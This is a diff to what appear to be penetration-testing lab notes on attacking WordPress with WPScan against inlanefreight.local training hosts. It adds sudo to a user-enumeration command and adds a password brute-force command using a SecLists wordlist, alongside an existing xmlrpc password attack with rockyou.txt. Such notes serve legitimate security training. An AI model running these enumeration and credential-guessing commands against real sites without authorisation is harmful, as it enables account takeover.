@@ -60,7 +60,7 @@ sudo wpscan -e ap -t 500 --url http://ir.inlanefreight.loca
 To enumerate users:
 
 ```shell
-wpscan -e u -t 500 --url http://ir.inlanefreight.local
+sudo wpscan -e u -t 500 --url http://ir.inlanefreight.local
 ```
 
 ```shell
@@ -75,6 +75,7 @@ We can obtain an API token from WPVulnDB, which is used by WPScan to scan for Po
 
 ```shell
 sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
+sudo wpscan --url http://ir.inlanefreight.local -U ilfreightwp -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top100.txt
 ```
 
 ### RCE
